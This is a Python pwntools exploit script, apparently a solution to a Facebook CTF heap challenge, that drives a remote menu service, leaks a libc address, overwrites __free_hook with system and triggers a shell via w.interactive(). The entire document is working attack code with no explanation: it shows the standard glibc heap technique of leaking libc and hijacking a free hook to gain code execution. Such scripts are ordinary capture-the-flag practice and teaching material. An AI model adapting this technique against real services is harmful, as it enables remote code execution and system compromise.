from pwn import *

w = remote("challenges3.fbctf.com",1343)
ww = ELF("./libc-2.27.so")

sla = w.sendlineafter
sl = w.sendline
sa = w.sendafter

def create(name):
    sl("1")
    sl(name)

def add(idx,num):
    sl("2")
    sl(str(idx))
    sl(str(num))

def view(idx,lidx):
    sl("3")
    sl(str(idx))
    sl(str(lidx))
    w.recvuntil("=")
    return int(w.recvline())

def dup(idx,name):
    sl("4")
    sl(str(idx))
    sl(name)

def remove(idx):
    sl("5")
    sl(str(idx))


create("w")
create("wally")

for i in range(0,0x18):
    add(0,1)

dup(0,"l")

for i in range(0,0x178):
    add(0,1)

dup(0,"wa")

for i in range(0,0x80):
    add(0,1)

low = view(3,0)
high = view(3,1)
libc = ((high<<32) +low) - 0x3ebca0
log.info(hex(libc)) 

hook = libc+ww.symbols['__free_hook']

add(2,1)
add(2,1)
add(2,1)
add(2,1)

add(2,u32(p64(hook)[:4]))
add(2,u32(p64(hook)[4:8]))

add(2,u32(p64(hook)[:4]))
add(2,u32(p64(hook)[4:8]))

one_g = libc+ww.symbols['system']
add(3,u32(p64(one_g)[:4]))
add(3,u32(p64(one_g)[4:8]))

add(1,0x6873)
add(1,0x1)

w.interactive()
